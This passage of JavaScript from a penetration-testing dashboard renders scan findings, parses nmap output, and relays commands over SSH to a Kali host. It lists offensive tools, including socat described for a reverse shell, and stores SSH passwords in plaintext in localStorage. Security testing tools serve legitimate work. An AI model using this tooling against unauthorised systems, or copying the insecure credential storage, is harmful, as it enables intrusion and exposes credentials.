            <div class="finding-card rounded-lg border transition-all hover:brightness-110 ${isInfo ? 'p-1.5' : 'p-2.5'}"
                 style="border-color:${color}33; background:${bg};"
                 data-severity="${sev}">
                <div class="flex items-start gap-1.5">
                    <span class="${isInfo ? 'text-[11px]' : 'text-[14px]'} mt-0.5 flex-shrink-0">${icon}</span>
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center gap-1.5">
                            <span class="${isInfo ? 'text-[10px]' : 'text-[11px]'} font-semibold truncate" style="color:${color}">${title}</span>
                            <span class="text-[7px] px-1 py-0.5 rounded font-bold tracking-wider flex-shrink-0"
                                  style="background:${color}22; color:${color}">${badge}</span>
                        </div>
                        ${subtitle ? `<div class="${isInfo ? 'text-[9px]' : 'text-[10px]'} text-gray-600 mt-0.5 truncate">${subtitle}</div>` : ''}
                        <div class="flex items-center gap-1.5 mt-0.5 ${isInfo ? 'text-[7px]' : 'text-[8px]'} text-gray-700">
                            <span>${f.tool}</span>
                            <span>·</span>
                            <span class="truncate max-w-[120px]">${f.target}</span>
                        </div>
                    </div>
                </div>
            </div>`;
    }

    // ── Append a single finding card to the DOM (without re-rendering everything) ──
    function _appendFindingCard(f) {
        const container = document.getElementById('findings-list');
        const empty = document.getElementById('findings-empty');
        if (!container) return;
        if (empty) empty.style.display = 'none';
        // Remove "no findings" placeholder if it's the only child
        if (container.children.length === 1 && container.children[0].id === 'findings-empty') {
            container.innerHTML = '';
        }
        container.insertAdjacentHTML('afterbegin', _renderOneFinding(f));
        updateFindingsCount();
        updateStats();
        _debounceSync();
    }

    function _currentTarget() {
        const el = document.getElementById('target-ip');
        return el ? el.value.trim() || 'unknown' : 'unknown';
    }

    function updateFindingsCount() {
        const el = document.getElementById('findings-count');
        if (el) el.textContent = `(${findings.length})`;
    }

    function updateStats() {
        const f = window.findings || [];
        const uniqueTargets = new Set(f.map(x => x.target || 'unknown'));
        const uniqueTools = new Set(f.map(x => x.tool || 'scan'));
        document.getElementById('stat-findings').textContent = f.length;
        document.getElementById('stat-targets').textContent = uniqueTargets.size;
        document.getElementById('stat-tools').textContent = uniqueTools.size;
        document.getElementById('stat-reports').textContent = (window.reports || []).length;
    }

    // ── Clear findings ──
    window.clearFindings = function () {
        findings.length = 0;
        renderFindings();
        updateFindingsCount();
        updateStats();
        // Also clear on backend
        fetch('/api/findings', { method: 'DELETE' }).catch(() => {});
        showToast('🗑️ Findings cleared');
    };

    // ── Export findings (via API for rich formatting) ──
    window.exportFindings = async function () {
        const f = window.findings || [];
        if (f.length === 0) {
            showToast('No findings to export');
            return;
        }
        const format = (document.getElementById('findings-format') || { value: 'md' }).value;
        const target = document.getElementById('target-ip')?.value?.trim() || 'unknown';
        const suggestions = window.suggestions || [];
        const date = new Date().toISOString().slice(0, 10);

        showToast('📝 Generating report...');

        try {
            const resp = await fetch('/api/report/generate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target,
                    title: `Findings Report — ${target} — ${new Date().toLocaleString()}`,
                    findings: f,
                    suggestions
                })
            });
            const json = await resp.json();
            const md = json.data?.raw_output || json.raw_output ||
                `# Findings Report\n\n${f.map(x => `- ${x.tool}: ${x.title || x.detail}`).join('\n')}`;
            const safeName = `mirv-bounty-${target.replace(/[^a-z0-9]/gi, '_')}-${date}`;

            if (format === 'md' || format === 'txt') {
                downloadString(md, `${safeName}.md`, 'text/markdown');
                showToast(`⬇ Report exported as ${format}`);
            } else if (format === 'html') {
                const html = buildExportHTML(md, 'Findings Report', 'findings');
                downloadString(html, `${safeName}.html`, 'text/html');
                showToast('⬇ HTML exported');
            } else if (format === 'pdf') {
                const html = buildExportHTML(md, 'Findings Report', 'findings');
                openPDFPreview(html, `Findings Report — ${date}`);
            }
        } catch (e) {
            showToast('⚠️ Error exporting report: ' + e.message);
        }
    };

    // ── Findings filter click handler ──
    document.addEventListener('click', (e) => {
        const btn = e.target.closest('.finding-filter');
        if (!btn) return;
        document.querySelectorAll('.finding-filter').forEach(b => {
            b.style.background = 'transparent';
            b.style.color = '#888';
        });
        btn.style.background = '#ffffff0a';
        btn.style.color = '#fff';
        renderFindings(btn.dataset.severity);
    });

    // ── Findings search on input ──
    document.addEventListener('input', (e) => {
        if (e.target.id === 'findings-search') {
            renderFindings(document.querySelector('.finding-filter.active')?.dataset.severity);
        }
    });

    // ============================================================
    //  SALIDA EN TERMINAL
    // ============================================================
    // Strip ANSI escape codes (colours, cursor moves, title sequences)
    function stripANSI(s) {
        return s
            .replace(/\x1b\[[\d;?]*[a-zA-Z]/g, '')   // CSI (colours, cursor, DEC private)
            .replace(/\x1b\][^\x07]*\x07/g, '')       // OSC (window title)
            .replace(/\x1b./g, '')                    // any remaining ESC + 1 char (ESC =, >, (, ), etc.)
            .replace(/[\uE000-\uF8FF\u200B-\u200F\u2028-\u202F]/g, ''); // Nerd Font icons (PUA) + zero-width chars
    }

    // ── Command history (client-side) ──
    const cmdHistory = [];
    let cmdHistoryIdx = -1;
    const CMD_HISTORY_MAX = 100;

    window.sendCommand = function () {
        if (!ensureConnected()) return;
        const cmd = cmdInput.value.trim();
        if (!cmd) return;
        ws.send(cmd);
        // Store in history (avoid dupes)
        if (cmdHistory.length === 0 || cmdHistory[cmdHistory.length - 1] !== cmd) {
            cmdHistory.push(cmd);
            if (cmdHistory.length > CMD_HISTORY_MAX) cmdHistory.shift();
        }
        cmdHistoryIdx = cmdHistory.length; // reset index to end
        cmdInput.value = '';
    };

    window.stopCommand = function () {
        if (!ensureConnected()) return;
        ws.send(JSON.stringify({ type: 'interrupt' }));
        appendOutput('\n⏹ Sending interrupt (Ctrl+C)...\n');
        showToast('⏹ Interrupt sent');
    };

    // Arrow up/down → navigate history
    cmdInput.addEventListener('keydown', (event) => {
        if (event.key === 'ArrowUp') {
            event.preventDefault();
            if (cmdHistoryIdx > 0) {
                cmdHistoryIdx--;
                cmdInput.value = cmdHistory[cmdHistoryIdx];
                // Force focus + cursor to end (fixes visual glitch when terminal updates)
                cmdInput.focus();
                cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
            }
        } else if (event.key === 'ArrowDown') {
            event.preventDefault();
            if (cmdHistoryIdx < cmdHistory.length - 1) {
                cmdHistoryIdx++;
                cmdInput.value = cmdHistory[cmdHistoryIdx];
                cmdInput.focus();
                cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
            } else {
                cmdHistoryIdx = cmdHistory.length;
                cmdInput.value = '';
                cmdInput.focus();
            }
        } else if (event.key === 'Tab') {
            event.preventDefault();
            requestTabCompletion();
        }
    });

    // ── Tab Completion System (via backend exec_command — no shell echo) ──
    let _compTimer = null;

    function getCurrentWord() {
        const text = cmdInput.value;
        const cursor = cmdInput.selectionStart || text.length;
        let start = cursor;
        while (start > 0 && text[start - 1] !== ' ') start--;
        return { word: text.slice(start, cursor), prefix: text.slice(0, start), suffix: text.slice(cursor) };
    }

    function requestTabCompletion() {
        if (!ws || ws.readyState !== WebSocket.OPEN) return;
        const { word } = getCurrentWord();
        if (!word) return;

        const textBefore = cmdInput.value.slice(0, cmdInput.selectionStart || cmdInput.value.length);
        const words = textBefore.trim().split(/\s+/);
        const isFirstWord = words.length === 1 && !textBefore.includes(' ');

        // Send JSON to backend — runs compgen via exec_command (no shell echo)
        ws.send(JSON.stringify({
            type: "tab_complete",
            text: word,
            is_command: isFirstWord
        }));

        // Safety timeout: clear dropdown state after 5s
        if (_compTimer) clearTimeout(_compTimer);
        _compTimer = setTimeout(() => {
            const dd = document.getElementById('tab-completions');
            if (dd) dd.classList.add('hidden');
        }, 5000);
    }

    function showCompletionDropdown(items) {
        const dropdown = document.getElementById('tab-completions');
        if (!dropdown) return;

        const unique = [...new Set(items)].sort();
        dropdown.innerHTML = '';

        if (unique.length === 0) {
            dropdown.classList.add('hidden');
            return;
        }

        if (unique.length === 1) {
            applyCompletion(unique[0]);
            dropdown.classList.add('hidden');
            showToast(`⭾ ${unique[0]}`);
            return;
        }

        const maxShow = 12;
        const show = unique.slice(0, maxShow);
        for (const item of show) {
            const div = document.createElement('div');
            div.className = 'px-3 py-1.5 text-[13px] text-gray-200 hover:text-white hover:bg-neon/15 cursor-pointer transition-all font-mono border-b border-gray-800 last:border-0';
            div.textContent = item;
            div.addEventListener('click', () => {
                applyCompletion(item);
                dropdown.classList.add('hidden');
                cmdInput.focus();
            });
            dropdown.appendChild(div);
        }
        if (unique.length > maxShow) {
            const more = document.createElement('div');
            more.className = 'px-3 py-1 text-[9px] text-gray-700 text-center';
            more.textContent = `⋯ ${unique.length - maxShow} more`;
            dropdown.appendChild(more);
        }

        // ── Smart positioning: measure available space above the input ──
        const inputRect = cmdInput.getBoundingClientRect();
        const spaceAbove = inputRect.top;
        const spaceBelow = window.innerHeight - inputRect.bottom;
        const itemHeight = 32; // ~32px per item including padding+border
        const estimatedHeight = Math.min(show.length * itemHeight + 30, 180);

        // Remove both positioning classes, then add the appropriate one
        dropdown.classList.remove('above', 'below');

        if (spaceAbove >= estimatedHeight || spaceAbove >= spaceBelow) {
            // Show ABOVE the input (default)
            dropdown.style.maxHeight = Math.min(spaceAbove - 24, 180) + 'px';
            dropdown.style.bottom = '100%';
            dropdown.style.top = 'auto';
            dropdown.style.marginBottom = '6px';
            dropdown.style.marginTop = '0';
        } else {
            // Show BELOW the input (more room there)
            dropdown.style.maxHeight = Math.min(spaceBelow - 24, 180) + 'px';
            dropdown.style.top = '100%';
            dropdown.style.bottom = 'auto';
            dropdown.style.marginTop = '6px';
            dropdown.style.marginBottom = '0';
        }

        dropdown.classList.remove('hidden');

        // Keyboard navigation
        window._tabItems = unique;
        window._tabIndex = -1;
    }

    function applyCompletion(item) {
        const { word } = getCurrentWord();
        const cursor = cmdInput.selectionStart || cmdInput.value.length;
        const before = cmdInput.value.slice(0, cursor - word.length);
        const after = cmdInput.value.slice(cursor);
        // If item looks like a directory (or is below /), append / for further completion
        let completed = item;
        if (completed.includes(' ')) completed = completed.replace(/ /g, '\\ ');
        cmdInput.value = before + completed + after;
        const newPos = before.length + completed.length;
        cmdInput.setSelectionRange(newPos, newPos);
        cmdInput.focus();
    }

    // Close dropdown when clicking outside
    document.addEventListener('click', (e) => {
        const dd = document.getElementById('tab-completions');
        const inp = document.getElementById('cmd-input');
        if (dd && !dd.contains(e.target) && e.target !== inp) {
            dd.classList.add('hidden');
        }
    });

    // Keyboard nav for open dropdown
    document.addEventListener('keydown', (e) => {
        const dd = document.getElementById('tab-completions');
        if (!dd || dd.classList.contains('hidden')) return;

        if (e.key === 'Escape') {
            dd.classList.add('hidden');
            e.preventDefault();
            return;
        }
        if (e.key === 'Enter' && window._tabIndex >= 0 && window._tabItems) {
            e.preventDefault();
            applyCompletion(window._tabItems[window._tabIndex]);
            dd.classList.add('hidden');
            return;
        }
        if (e.key === 'Tab') {
            e.preventDefault();
            const items = window._tabItems;
            if (items && items.length > 0) {
                const idx = window._tabIndex >= 0 ? window._tabIndex : 0;
                applyCompletion(items[idx]);
                dd.classList.add('hidden');
            }
            return;
        }
        if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
            e.preventDefault();
            const items = window._tabItems;
            if (!items || items.length === 0) return;
            const children = dd.children;
            if (window._tabIndex >= 0 && children[window._tabIndex]) {
                children[window._tabIndex].classList.remove('bg-neon/10', 'text-neon');
            }
            if (e.key === 'ArrowDown') {
                window._tabIndex = Math.min(window._tabIndex + 1, children.length - 1);
            } else {
                window._tabIndex = Math.max(window._tabIndex - 1, -1);
            }
            if (window._tabIndex >= 0 && children[window._tabIndex]) {
                children[window._tabIndex].classList.add('bg-neon/10', 'text-neon');
                children[window._tabIndex].scrollIntoView({ block: 'nearest' });
            }
        }
    });

    window.appendOutput = function (text) {
        text = stripANSI(text);

        // Normalize CRLF → LF first (shell uses \r\n for line breaks)
        text = text.replace(/\r\n/g, '\n');

        // Handle standalone \r (progress updates like apt: "0%\r100%\r")
        if (text.includes('\r')) {
            const parts = text.split('\r');
            for (const part of parts) {
                if (part === '') continue;
                const lastNewline = output.textContent.lastIndexOf('\n');
                if (lastNewline === -1) {
                    output.textContent = part;
                } else {
                    output.textContent = output.textContent.substring(0, lastNewline + 1) + part;
                }
            }
        } else {
            output.textContent += text + (text.endsWith('\n') ? '' : '\n');
        }

        // Real-time nmap port detection: catch open ports as they appear
        // (not just at tool completion, since -p- can take hours)
        if (text && (currentToolRunning === 'nmap' || pendingTool === 'nmap')) {
            const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?/gi;
            let pm;
            while ((pm = portRegex.exec(text)) !== null) {
                const portKey = `nmap|${pm[1]}/${pm[2]}|${pm[3] || '?'}`;
                if (findings.some(f => f.tool === 'nmap' && f.port === pm[1])) continue;
                const finding = {
                    tool: 'nmap', target: _currentTarget(),
                    type: 'port', port: pm[1], protocol: pm[2],
                    service: pm[3] || '?', version: (pm[4] || '').trim(),
                    severity: assignSeverity({ port: pm[1], service: pm[3] || '' }),
                    id: _hashStr(portKey)
                };
                findings.unshift(finding);
                _appendFindingCard(finding);
            }
        }

        // Buffer for findings parsing (ALWAYS accumulate, regardless of currentToolRunning)
        outputBuffer += text + '\n';
        if (outputBuffer.length > 100000) {
            outputBuffer = outputBuffer.slice(-50000);
        }

        // Detect prompt → trigger tool completion parser
        // Prompt format: "... with javi@kali  at HH:MM:SS  "
        if ((currentToolRunning || pendingTool) && /with\s+\S+\s+at\s+\d{1,2}:\d{2}:\d{2}/.test(text)) {
            clearTimeout(window._toolFinishTimer);
            window._toolTimerLongSet = false;
            finishToolOutput();
            pendingTool = null; // only cleared when prompt is actually detected
        }

        // Use setTimeout(0) for scroll — fires before requestAnimationFrame
        // and is more reliable for keeping scroll position during rapid output
        clearTimeout(window._scrollTimer);
        window._scrollTimer = setTimeout(() => {
            output.scrollTop = output.scrollHeight;
        }, 0);
    };

    // Click terminal output area → focus the command input
    output.addEventListener('click', () => cmdInput.focus());

    // ── Generate a deterministic compound key for a finding (for dedup) ──
    function _findingKey(f) {
        let base = `${f.tool}|${f.target}|${f.type}`;
        switch (f.type) {
            case 'port':     return `${base}|${f.port}/${f.protocol}|${f.service}`;
            case 'directory': return `${base}|${f.path}|${f.status}`;
            case 'vuln':     return `${base}|${(f.title||'').slice(0,80)}|${(f.detail||'').slice(0,80)}`;
            case 'tech':     return `${base}|${f.title}`;
            case 'user':     return `${base}|${f.title}`;
            case 'plugin':   return `${base}|${f.title}`;
            case 'os':       return `${base}|${f.detail||''}`;
            default:         return `${base}|${f.title||''}|${f.detail||''}`;
        }
    }

    // Called when we detect a tool has finished
    function finishToolOutput() {
        const tool = currentToolRunning || pendingTool;
        if (!tool || !outputBuffer || _toolParsed) return;

        // ⚡ Mark parsed IMMEDIATELY to prevent race with safety timer
        _toolParsed = true;

        const buf = outputBuffer;
        const target = targetInput.value.trim() || 'unknown';

        // Visual debug: show a badge in terminal
        const dbg = document.getElementById('fdbg');
        if (dbg) dbg.textContent = `⚙ parsing ${tool}...`;

        // Small delay to let the DOM settle (but dedup is now safe)
        setTimeout(() => {
            // Legacy report parsers
            if (tool === 'nmap') parseNmapOutput(buf, target);
            else if (tool === 'gobuster') parseGobusterOutput(buf, target);

            // NEW: Findings parsers (T3MP3ST-style)
            const items = parseToolOutput(tool, buf, target);
            if (items.length > 0) {
                addFindings(items);
            }
            if (dbg) dbg.textContent = `✓ ${items.length} findings (buf:${buf.length})`;
            setTimeout(() => { if (dbg) dbg.textContent = ''; }, 4000);
        }, 100);

        currentToolRunning = null;
        // pendingTool stays set until prompt is detected (cleared there)
        outputBuffer = '';
    }

    // ── Clear Terminal ──
    window.clearTerminal = function () {
        output.textContent = '';
        outputBuffer = '';
        currentToolRunning = null;
        pendingTool = null;
        _toolParsed = false;
        clearTimeout(window._toolFinishTimer);
        showToast('✕ Terminal cleared');
    };

    // ── File Upload to Kali (with chunked base64 for large files) ──
    window.handleFileUpload = async function (input) {
        const file = input.files && input.files[0];
        if (!file) return;
        const CHUNK_SIZE = 98 * 1024; // ~98KB base64 chunks (safe for SSH)
        const status = document.getElementById('file-upload-status');
        status.textContent = `📄 ${file.name} (${(file.size / 1024).toFixed(1)} KB)...`;

        // Try Supabase Storage first (if available)
        if (DataService && DataService.available) {
            status.textContent = `⬆ Uploading to cloud storage...`;
            showToast('⬆ Uploading to Supabase Storage...');
            const result = await DataService.uploadFile(file);
            if (result && result.public_url) {
                status.textContent = `✅ ${file.name} → cloud (${(file.size / 1024).toFixed(1)} KB)`;
                appendOutput(`\n▶ Uploaded to cloud: ${result.public_url}`);
                input.value = '';
                return;
            } else {
                status.textContent = `⚠️ Cloud upload failed, trying SSH...`;
            }
        }

        // ── SSH upload via base64 chunks (works for ALL file types) ──
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            status.textContent = `⚠️ Not connected — can't upload`;
            appendOutput('[!] Not connected to Kali. Connect first.');
            input.value = '';
            return;
        }

        const filename = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
        showToast(`⬆ Uploading ${filename} (${(file.size / 1024).toFixed(1)} KB)...`);

        // Read file as base64
        const reader = new FileReader();
        reader.onload = async function (e) {
            const base64data = e.target.result; // data:...;base64,XXXX
            const b64 = base64data.split(',')[1]; // strip the data URL prefix
            const totalChunks = Math.ceil(b64.length / CHUNK_SIZE);

            // Start fresh on Kali
            ws.send(`rm -f /tmp/${filename}.b64`);
            await new Promise(r => setTimeout(r, 200));

            for (let i = 0; i < totalChunks; i++) {
                const chunk = b64.slice(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
                ws.send(`printf '%s' '${_escapeSingleQuotes(chunk)}' >> /tmp/${filename}.b64`);
                status.textContent = `📤 Chunk ${i+1}/${totalChunks} (${Math.round((i+1)/totalChunks*100)}%)`;
                // Small delay to avoid flooding the SSH channel
                await new Promise(r => setTimeout(r, 50 + Math.min(chunk.length / 50, 200)));
            }

            // Decode base64 → final file
            ws.send(`base64 -d /tmp/${filename}.b64 > /tmp/${filename} && rm -f /tmp/${filename}.b64`);
            await new Promise(r => setTimeout(r, 300));
            ws.send(`ls -lh /tmp/${filename}`);
            status.textContent = `✅ ${file.name} uploaded to Kali:/tmp/ (${totalChunks} chunks)`;
            appendOutput(`\n▶ Uploaded "${file.name}" to /tmp/${filename} (${totalChunks} chunks)`);
            showToast(`📁 Uploaded ${filename} to Kali`);
            input.value = '';
        };
        reader.onerror = function () {
            status.textContent = '⚠️ Error reading file';
            appendOutput('[!] Error reading file for upload');
            input.value = '';
        };
        reader.readAsDataURL(file); // Read as base64 data URL
    };

    // ── Helper: escape single quotes for safe shell use ──
    function _escapeSingleQuotes(str) {
        // For printf '%s', only ' needs escaping (end quote, add \', resume quote)
        return str.replace(/'/g, "'\\''");
    }

    window.appendBanner = function () {
        appendOutput('');
        appendOutput('  ███╗   ███╗██╗██████╗ ██╗   ██╗');
        appendOutput('  ████╗ ████║██║██╔══██╗██║   ██║');
        appendOutput('  ██╔████╔██║██║██████╔╝██║   ██║');
        appendOutput('  ██║╚██╔╝██║██║██╔══██╗╚██╗ ██╔╝');
        appendOutput('  ██║ ╚═╝ ██║██║██║  ██║ ╚████╔╝ ');
        appendOutput('  ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('  🌐 M.I.R.V. — Multi-platform Incident Response & Vulnerabilities  |  ⚡ 51 modules loaded');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('');
    };

    // ============================================================
    //  CONNECTION MANAGER (DB + localStorage cache)
    //  Offline-first: try API, fall back to localStorage.
    // ============================================================
    function loadConnections() {
        // Try DB first
        if (window.DataService && DataService.available) {
            DataService.listConnections().then(list => {
                if (list && list.length > 0) {
                    connections = list;
                    localStorage.setItem('vulnforge_connections', JSON.stringify(list));
                    renderConnections();
                    return;
                }
                _loadConnectionsLocal();
            }).catch(() => _loadConnectionsLocal());
        } else {
            _loadConnectionsLocal();
        }
    }

    function _loadConnectionsLocal() {
        try {
            const stored = localStorage.getItem('vulnforge_connections');
            connections = stored ? JSON.parse(stored) : [];
        } catch {
            connections = [];
        }
        renderConnections();
    }

    function saveConnections() {
        localStorage.setItem('vulnforge_connections', JSON.stringify(connections));
        // Also save to DB in background
        if (window.DataService && DataService.available) {
            connections.forEach(c => {
                if (!c._dbSynced) {
                    DataService.saveConnection(c).then(r => {
                        if (r) c._dbSynced = true;
                    }).catch(() => {});
                }
            });
        }
        renderConnections();
    }

    function renderConnections() {
        connSelector.innerHTML = '<option value="">-- Select target --</option>';
        connections.forEach((c, i) => {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = `${c.name || 'Unknown'} (${c.ip})`;
            connSelector.appendChild(opt);
        });
        if (activeConnectionId !== null) {
            const exists = connections.some((_, i) => i === activeConnectionId);
            if (!exists) { activeConnectionId = null; hideActiveConn(); }
            else { showActiveConn(connections[activeConnectionId]); }
        }
    }

    function showActiveConn(conn) {
        activeConn.classList.remove('hidden');
        connDot.className = 'conn-dot ' + (ws && ws.readyState === WebSocket.OPEN ? 'online' : 'offline');
        connLabel.textContent = `${conn.name} (${conn.ip})`;
    }

    function hideActiveConn() {
        activeConn.classList.add('hidden');
    }

    window.showAddConnection = function () {
        document.getElementById('add-conn-form').classList.remove('hidden');
    };
    window.toggleAddConnection = function () {
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    window.saveConnection = function () {
        const name = document.getElementById('new-conn-name').value.trim();
        const ip   = document.getElementById('new-conn-ip').value.trim();
        const port = parseInt(document.getElementById('new-conn-port').value) || 22;
        const user = document.getElementById('new-conn-user').value.trim();
        const pass = document.getElementById('new-conn-pass').value;
        if (!name || !ip || !user || !pass) {
            alert('⚠️  Fill in all fields: Alias, IP, User, Pass');
            return;
        }
        const conn = { name, ip, port, user, pass };
        connections.push(conn);
        saveConnections();
        // Sync to DB in background
        if (window.DataService && DataService.available) {
            DataService.saveConnection(conn).then(r => {
                if (r) conn._dbSynced = true;
            }).catch(() => {});
        }
        showToast(`✓ Connection "${name}" saved`);
        document.getElementById('new-conn-name').value = '';
        document.getElementById('new-conn-ip').value = '';
        document.getElementById('new-conn-port').value = '22';
        document.getElementById('new-conn-user').value = '';
        document.getElementById('new-conn-pass').value = '';
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    connSelector.addEventListener('change', () => {
        const idx = parseInt(connSelector.value);
        if (isNaN(idx)) return;
        activeConnectionId = idx;
        const conn = connections[idx];
        showActiveConn(conn);
        targetInput.value = conn.ip;
        window.lastScopedIp = conn.ip;
    });

    window.disconnectConn = function () {
        disconnectWS();
        activeConnectionId = null;
        hideActiveConn();
        connSelector.value = '';
    };

    window.deleteActiveConnection = function () {
        if (activeConnectionId === null) return;
        const conn = connections[activeConnectionId];
        if (!conn) return;
        if (!confirm(`Delete connection "${conn.name}" (${conn.ip})?`)) return;
        disconnectWS();
        // Delete from DB if it has an id
        if (conn.id && window.DataService && DataService.available) {
            DataService.deleteConnection(conn.id).catch(() => {});
        }
        connections.splice(activeConnectionId, 1);
        activeConnectionId = null;
        saveConnections();
        hideActiveConn();
        connSelector.value = '';
        showToast(`🗑 Connection "${conn.name}" deleted`);
    };

    // ============================================================
    //  WEBSOCKET — SSH
    // ============================================================
    function connectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[!] Already connected.');
            return;
        }
        if (activeConnectionId === null || !connections[activeConnectionId]) {
            appendOutput('[!] No connection selected. Go to Connections tab, add a target, and select it first.');
            return;
        }
        const conn = connections[activeConnectionId];
        const sshIp = conn.ip, sshPort = conn.port || 22, sshUser = conn.user, sshPass = conn.pass;
        appendOutput(`[*] Connecting to ${conn.name} (${sshIp}:${sshPort})...`);
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const WS_URL = window.WS_URL || `${protocol}//${window.location.host}/ws`;
        ws = new WebSocket(WS_URL);

        ws.onopen = () => {
            statusInd.classList.replace('offline', 'online');
            statusText.textContent = 'ONLINE';
            statusText.classList.replace('text-gray-600', 'text-neon');
            if (activeConnectionId !== null) connDot.className = 'conn-dot online';
            connBadge.textContent = `connected: ${sshUser}@${sshIp}:${sshPort}`;
            connTitle.textContent = `─╼ ${sshUser}@${sshIp}:${sshPort} ╾───────────────────────────`;
            ws.send(JSON.stringify({ type: 'auth', ip: sshIp, port: sshPort, user: sshUser, pass: sshPass }));
            window.lastScopedIp = sshIp;
        };

        ws.onmessage = (event) => {
            const data = event.data;

            // Handle JSON protocol messages
            if (typeof data === 'string' && data.startsWith('{') && data.includes('"type"')) {
                try {
                    const msg = JSON.parse(data);
                    if (msg.type === 'connected') {
                        appendOutput(`[+] ${msg.message || 'SSH connection established'}`);
                    } else if (msg.type === 'error') {
                        appendOutput(`[!] ${msg.message || 'Unknown error'}`);
                    } else if (msg.type === 'tab_result') {
                        // Tab completion results from exec_command
                        if (_compTimer) clearTimeout(_compTimer);
                        showCompletionDropdown(msg.completions || []);
                        return;
                    }
                    return;
                } catch {}
            }

            appendOutput(data);

            // Safety timer: if prompt is not detected within 30s, force-parse
            // (so tools that don't produce a matching prompt still get findings)
            if (currentToolRunning && !window._toolTimerLongSet) {
                window._toolTimerLongSet = true;
                clearTimeout(window._toolFinishTimer);
                window._toolFinishTimer = setTimeout(() => {
                    window._toolTimerLongSet = false;
                    // Only parse if still running and buffer has data
                    if ((currentToolRunning || pendingTool) && outputBuffer.length > 200) {
                        finishToolOutput();
                    }
                }, 30000); // 30s safety net
            }
        };

        ws.onclose = () => {
            statusInd.classList.replace('online', 'offline');
            statusText.textContent = 'OFFLINE';
            statusText.classList.replace('text-neon', 'text-gray-600');
            connBadge.textContent = 'disconnected';
            connDot.className = 'conn-dot offline';
            appendOutput('\n[!] Connection closed.');
            ws = null;
        };
    }

    function disconnectWS() {
        currentToolRunning = null;
        pendingTool = null;
        _toolParsed = false;
        outputBuffer = '';
        clearTimeout(window._toolFinishTimer);
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[*] Closing connection...');
            ws.close();
        } else {
            appendOutput('[!] No active connection.');
        }
    }

    // ============================================================
    //  PREDEFINED COMMANDS (arsenal)
    // ============================================================
    window.sendPredefinedCmd = function (cmd) {
        if (!ensureConnected()) {
            appendOutput('[!] Connect to Kali first before launching modules.');
            return;
        }
        // Track tools used in this session for Mission History (Self-Improvement Loop)
        try {
            if (cmd && !toolsUsedThisSession.some(t => t.command === cmd)) {
                toolsUsedThisSession.push({ tool: currentToolRunning || 'manual', command: cmd });
            }
        } catch {}
        appendOutput(`\n▶ ${cmd}`);
        ws.send(cmd);
    };

    // ============================================================
    //  ARSENAL DATA + RENDER
    // ============================================================
    const ARSENAL_GROUPS = [
        {
            id: 'web-recon', label: 'Web Recon', color: 'text-cyan-400',
            tools: [
                { id: 'gobuster',    name: 'Gobuster',    desc: 'directorios web (common.txt)' },
                { id: 'dirb',        name: 'Dirb',        desc: 'fuerza bruta directorios' },
                { id: 'wfuzz',       name: 'Wfuzz',       desc: 'fuzzing (FUZZ param)' },
                { id: 'ffuf',        name: 'Ffuf',        desc: 'fuzzer ultrarrápido' },
                { id: 'feroxbuster', name: 'Feroxbuster', desc: 'directory scan rápido (Rust)' },
                { id: 'nikto',       name: 'Nikto',       desc: 'escáner vulnerabilidades web' },
                { id: 'whatweb',     name: 'WhatWeb',     desc: 'fingerprint tecnologías' },
                { id: 'wpscan',      name: 'Wpscan',      desc: 'escáner WordPress' },
                { id: 'cewl',        name: 'Cewl',        desc: 'generador wordlists desde web' },
                { id: 'wafw00f',     name: 'Wafw00f',     desc: 'detección WAF / IDS fingerprint' },
                { id: 'cors-check',  name: 'CORS Check',  desc: 'prueba CORS misconfiguration (Origin)' },
                { id: 'headers-scan', name: 'Headers Scan', desc: 'audita headers HTTP seguridad A-F' },
                { id: 'secrets-scan', name: 'Secrets Scan', desc: 'detecta API keys, tokens, passwords expuestos' },
                { id: 'port-scan',      name: 'Port Scan',      desc: 'escaneo TCP asíncrono (~300 puertos)' },
                { id: 'subdomain-scan', name: 'Subdomain Scan', desc: 'enumera subdominios vía DNS (~700 prefijos)' },
                { id: 'hash-crack', name: 'Hash Cracker', desc: 'identifica y crackea hashes (MD5/SHA1/256/512/NTLM, ~200 rainbow)' },
                { id: 'stego-tool', name: 'Stego Tool', desc: 'analiza imágenes PNG/BMP para steganografía LSB y trailing data' },
                { id: 'news-scraper', name: 'News Scraper', desc: 'últimas noticias de ciberseguridad (9 fuentes RSS/Atom)' },
                { id: 'api-scanner', name: 'API Scanner', desc: 'escanea APIs REST (65+ paths, CORS, headers, data exposure)' },
            ]
        },
        {
            id: 'network', label: 'Network', color: 'text-violet-400',
            tools: [
                { id: 'nmap',       name: 'Nmap',      desc: 'agresivo (-p- -sV -sC -O -A)' },
                { id: 'masscan',    name: 'Masscan',   desc: 'escaneo masivo 65535 puertos' },
                { id: 'netcat',     name: 'Netcat',    desc: 'escaneo TCP rápido 24 puertos' },
                { id: 'dnsrecon',   name: 'Dnsrecon',  desc: 'enumeración DNS' },
                { id: 'curl',       name: 'Curl',      desc: 'peticiones HTTP avanzadas' },
                { id: 'socat',      name: 'Socat',     desc: 'relay TCP/UDP, reverse shell' },
                { id: 'testssl',    name: 'TestSSL',     desc: 'análisis SSL/TLS (ciphers, vulns)' },
                { id: 'dns-lookup', name: 'DNS Lookup',  desc: 'registros A/AAAA/MX/TXT/NS/CNAME/SOA + reverse' },
            ]
        },
        {
            id: 'smb', label: 'SMB / Windows', color: 'text-amber-400',
            tools: [
                { id: 'enum4linux',  name: 'Enum4linux',  desc: 'enumeración SMB completa' },
                { id: 'smbclient',   name: 'Smbclient',   desc: 'listar shares (null session)' },
